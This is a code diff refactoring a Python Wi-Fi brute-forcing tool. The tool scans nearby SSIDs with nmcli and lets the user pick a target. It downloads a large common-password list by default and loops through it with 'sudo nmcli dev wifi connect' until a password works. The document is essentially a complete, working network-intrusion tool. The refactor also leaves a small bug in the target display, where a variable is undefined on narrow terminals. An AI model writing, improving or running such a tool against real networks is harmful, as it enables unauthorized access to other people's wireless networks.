@@ -1,10 +1,16 @@
+import subprocess
+from typing import Optional
 import argparse
 import subprocess
 import os
-from ssid import start
 import urllib.request
 import sys
 import time
+import shlex
+from typing import Generator
+from tqdm import tqdm
+
+DEFAULT_PASSWORD_LIST_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt"
 
 # service NetworkManager restart
 
@@ -71,6 +77,12 @@ def argument_parser():
     	help='Optional: Use to show all passwords attempted, rather than just the successful one.'
     )
 
+    parser.add_argument(
+        '-l', '--list-ssids',
+        action='store_true',
+        help='List all available SSIDs'
+    )
+
     return parser.parse_args()
 
 
@@ -135,25 +147,18 @@ def require_root():
 """
 
 
-def display_targets(networks, security_type):
+def display_targets(ssid_list: list[tuple[str, str]]):
     print("Select a target: \n")
     
-    rows, columns = os.popen('stty size', 'r').read().split()
-    for i in range(len(networks)):
-        width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
-        spacer = " "
+    _rows, columns = os.popen('stty size', 'r').read().split()
+    if (int(columns) >= 100):
+        col_shift = int(int(columns) * 0.75)
+    
+    for i, (ssid, security_type) in enumerate(ssid_list):
+        spacer_width = int(columns) - len(f"{i + 1}. {ssid}") - 7 - col_shift
+        spaces = f" {spacer_width * '.'} "
 
-        if (int(columns) >= 100):
-            calc = int((int(columns)-int(width))*0.75)
-        else:
-            calc = int(columns)-int(width)
-            
-        for index in range(calc):
-            spacer += "."
-            if index == (calc-1):
-                spacer += " "
-                
-        print(str(i+1)+". "+networks[i]+spacer+security_type[i])
+        print(f"{i + 1}. {ssid}{spaces}{security_type}")
         
 """
 	This functions prompt the user to enter the target choice and returns the choice.
@@ -161,16 +166,25 @@ def display_targets(networks, security_type):
 """
 
 
-def prompt_for_target_choice(max):
+def prompt_for_target_choice(ssid_list: list[tuple[str, str]]) -> str:
     while True:
         try:
             selected = int(input("\nEnter number of target: "))
-            if(selected >= 1 and selected <= max):
-                return selected - 1
-        except Exception as e:
-            ignore = e
+            if(selected >= 1 and selected <= len(ssid_list)):
+                return ssid_list[selected - 1][0]
+        except Exception:
+            pass
 
-        print("Invalid choice: Please pick a number between 1 and " + str(max))
+        print(f"Invalid choice: Please pick a number between 1 and {len(ssid_list)}")
+
+
+def normalized_passwords(passwords: list[str]) -> Generator[str, None, None]:
+    for password in passwords:
+        # necessary due to NetworkManager restart after unsuccessful attempt at login
+        password = password.strip()
+
+        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
+        yield password if isinstance(password, str) else password.decode("utf-8")
 
 
 """
@@ -178,22 +192,17 @@ def prompt_for_target_choice(max):
 """
 
 
-def brute_force(selected_network, passwords, args):
-    for password in passwords:
-        # necessary due to NetworkManager restart after unsuccessful attempt at login
-        password = password.strip()
-
-        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
-        if isinstance(password, str):
-            decoded_line = password
-        else:
-            decoded_line = password.decode("utf-8")
+def brute_force(ssid, passwords, args):
+    # Convert passwords to list for tqdm to work properly
+    password_list = list(normalized_passwords(passwords))
+    
+    for password in tqdm(password_list, desc=f"Brute-forcing {ssid}", unit="passwords"):
             
         if args.verbose is True:
             print(bcolors.HEADER+"** TESTING **: with password '" +
-                decoded_line+"'"+bcolors.ENDC)
+                password+"'"+bcolors.ENDC)
 
-        if (len(decoded_line) >= 8):
+        if (len(password) >= 8):
             contain = False
             
             while contain == False:
@@ -201,51 +210,80 @@ def brute_force(selected_network, passwords, args):
                 available = available.split('\n')
                 available = [item.strip() for item in available]
             
-                if selected_network in available:
+                if ssid in available:
                     contain = True
                 else:
                     time.sleep(1)
             
-            commands = [
-                "sudo",
-                "nmcli",
-                "dev",
-                "wifi",
-                "connect",
-                selected_network,
-                "password",
-                decoded_line,
-            ]
-            
+            command = shlex.split(f"sudo nmcli dev wifi connect {shlex.quote(ssid)} password {shlex.quote(password)}")
             try:
-                output = subprocess.run(commands, capture_output=True, text=True, 
+                output = subprocess.run(command, capture_output=True, text=True, 
                     check=True)
                 if "error" in output.stdout.lower():
                     if args.verbose is True:
                         print(bcolors.FAIL+"** TESTING **: password '" +
-                            decoded_line+"' failed."+bcolors.ENDC)
+                            password+"' failed."+bcolors.ENDC)
                         print(f"{bcolors.VERBOSEGRAY}{output.stdout}{bcolors.ENDC}")
                 elif "successfull" in output.stdout.lower():
                     sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
-                        decoded_line+"' succeeded."+bcolors.ENDC)
+                        password+"' succeeded."+bcolors.ENDC)
                 else:
                     print(f"Unknown output: {output.stdout}")
             except subprocess.CalledProcessError:
                 if args.verbose is True:
                     print(bcolors.FAIL+"** TESTING **: password '" +
-                        decoded_line+"' failed."+bcolors.ENDC)
+                        password+"' failed."+bcolors.ENDC)
 
         else:
             if args.verbose is True:
                 print(bcolors.OKCYAN+"** TESTING **: password '" +
-                    decoded_line+"' too short, passing."+bcolors.ENDC)
+                    password+"' too short, passing."+bcolors.ENDC)
 
     print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)
 
 
-"""
-	The main function
-"""
+def fetch_ssids() -> dict[str, str]:
+	wifi_dict: dict[str, str] = {}
+
+	result = subprocess.run(
+        shlex.split("nmcli -f SSID,SECURITY dev wifi"),
+        capture_output=True,
+        text=True
+    ).stdout
+	for line in result.split("\n")[1:]:  # Skip header line
+		line = line.strip()   
+		if line and line != "--":
+			# Find the last occurrence of whitespace to separate SSID from SECURITY
+			# This handles SSIDs that contain spaces
+			last_space_index = line.rfind('  ')
+			if last_space_index != -1:
+				network_name = line[:last_space_index].strip()
+				security_type = line[last_space_index + 1:].strip()
+				if network_name and network_name != "--" and security_type:
+					if network_name not in wifi_dict:
+						wifi_dict[network_name] = security_type
+	return wifi_dict
+
+
+def fetch_passwords(args):
+    # The user chose to supplied their own url
+    if args.url is not None:
+        passwords = fetch_password_from_url(args.url)
+    # user elect to read passwords form a file
+    elif args.file is not None:
+        with open(args.file, "r") as file:
+            passwords = file.readlines()
+    else:
+        # fallback to the default list as the user didn't supply a password list
+        passwords = fetch_password_from_url(DEFAULT_PASSWORD_LIST_URL)
+        if passwords:
+            save_passwords_locally(passwords=passwords)
+            passwords = get_local_passwords()
+        elif local_passwords_file_exists():
+            passwords = get_local_passwords()
+        else:
+            sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)
+    return passwords
 
 
 def main():
@@ -254,50 +292,26 @@ def main():
     require_root()
     args = argument_parser()
 
-    # The user chose to supplied their own url
-    if args.url is not None:
-        passwords = fetch_password_from_url(args.url)
-    # user elect to read passwords form a file
-    elif args.file is not None:
-        file = open(args.file, "r")
-        passwords = file.readlines()
-        if not passwords:
-            print("Password file cannot be empty!")
-            exit(0)
-        file.close()
-    else:
-        # fallback to the default list as the user didn't supply a password list
-        default_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
-        passwords = fetch_password_from_url(default_url)
-        if passwords:
-            save_passwords_locally(passwords=passwords)
-            passwords = get_local_passwords()
-        elif local_passwords_file_exists():
-            passwords = get_local_passwords()
-        else:
-            sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)
-        
-
-    # grabbing the list of the network ssids
-    func_call = start(1)
-    networks = func_call[0]
-    security_type = func_call[1]
-    
-    if not networks:
+    ssids = fetch_ssids()
+    if not ssids:
         print("No networks found!")
         sys.exit(-1)
+    ssid_list = sorted(ssids.items(), key=lambda item: item[0].lower())
+    display_targets(ssid_list)
+    if args.list_ssids:
+        sys.exit(0)
 
-    display_targets(networks, security_type)
-    max = len(networks)
-    pick = prompt_for_target_choice(max)
-    target = networks[pick]
+    passwords = fetch_passwords(args)
+    if not passwords:
+        print("Password file cannot be empty!")
+        exit(0)
+
+    ssid = prompt_for_target_choice(ssid_list)
     
     cls()
     header()
-    
     print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")
-
-    brute_force(target, passwords, args)
+    brute_force(ssid, passwords, args)
 
 
 main()
